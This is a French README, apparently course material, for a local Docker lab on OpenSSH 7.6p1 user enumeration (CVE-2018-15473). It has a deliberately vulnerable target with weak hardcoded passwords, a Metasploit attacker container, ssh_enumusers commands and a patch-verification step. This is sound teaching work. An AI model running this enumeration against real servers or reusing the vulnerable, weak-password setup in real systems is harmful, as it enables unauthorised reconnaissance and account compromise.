# Labo SSH — Énumération d'utilisateurs (CVE-2018-15473)

Conteneur **volontairement vulnérable** pour le labo. À n'utiliser que sur ta
propre machine, en local. Ne jamais l'exposer à un réseau non maîtrisé.

## Les deux conteneurs

Le labo tourne avec `docker compose` et comprend **deux** conteneurs sur un
réseau Docker commun :

- **`ssh-lab`** (la cible) — base **Ubuntu 18.04** → **OpenSSH 7.6p1** (plage
  vulnérable ≤ 7.7). Comptes réels créés : `root` (`toor`) et `saqadmin`
  (`Password123`). L'énumération doit révéler ces deux-là comme **valides** et
  rejeter les noms absents. SSH publié sur **`127.0.0.1:2222`** côté hôte.
- **`attacker`** — image officielle **Metasploit** (`metasploitframework/
  metasploit-framework`). Rien à installer sur ta machine : tout l'outillage
  est déjà dans ce conteneur. Depuis lui, la cible est joignable par son nom de
  service **`ssh-lab` sur le port 22** (le `2222` n'est que la publication côté
  hôte).

> La première construction télécharge l'image Metasploit (~2 Go) : prévois un
> peu de temps et d'espace disque.

## Construire et démarrer

```bash
docker compose up --build -d
docker compose ps          # les deux conteneurs doivent etre "Up"
```

Vérifier la version annoncée (question A1) :

```bash
nmap -sV -p 2222 localhost
# ou, plus simple :
nc localhost 2222          # affiche la banniere SSH-2.0-OpenSSH_7.6p1 ...
```

## Démontrer l'énumération (question A3)

**En une commande** (script `enum.rc` déjà monté dans le conteneur attaquant) :

```bash
docker compose exec attacker msfconsole -q -r /data/enum.rc
```

**Ou en interactif**, pour explorer le module :

```bash
docker compose exec attacker msfconsole -q
# puis, dans msf6 :
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS ssh-lab
set RPORT 22
set USER_FILE /data/liste_utilisateurs.txt
run
```

Résultat attendu : `root` et `saqadmin` signalés « valides », les autres non.
Le module décide à partir de la différence de comportement du serveur selon que
le compte existe ou non (voir corrigé A2).

> Metasploit affiche un avertissement « database not connected » : sans
> importance ici, le module `ssh_enumusers` n'a pas besoin de base de données.

## Alternative sans Metasploit

Si tu préfères un outil léger, un *PoC* public de CVE-2018-15473 en Python
(basé sur `paramiko`) fait la même démonstration. Dis-le-moi et je te prépare
un troisième conteneur minimal à la place de Metasploit.

## Vérifier le correctif (question A5)

Pour montrer que la faille disparaît avec une version corrigée, reconstruis sur
une base récente (OpenSSH ≥ 7.8) et relance l'énumération : le serveur répond
désormais de façon uniforme et le module ne distingue plus les comptes.

```bash
# Exemple : remplacer la premiere ligne du Dockerfile par
# FROM ubuntu:22.04        # OpenSSH 8.9p1, non vulnerable
```

## Arrêter et nettoyer

```bash
docker compose down
docker image rm ssh-enum-lab-ssh-lab 2>/dev/null || true
# L'image Metasploit est volumineuse ; a supprimer seulement si tu as fini :
# docker image rm metasploitframework/metasploit-framework:latest
```

## Dépannage

- **Échec de `apt-get` au build** : Ubuntu 18.04 est en fin de vie ; décommente
  la ligne `sed ... old-releases.ubuntu.com` dans le `Dockerfile`, puis
  reconstruis avec `docker compose build --no-cache`.
- **`nmap` indique `filtered`** : attends quelques secondes après
  `docker compose up`, le temps que `sshd` démarre, puis relance.
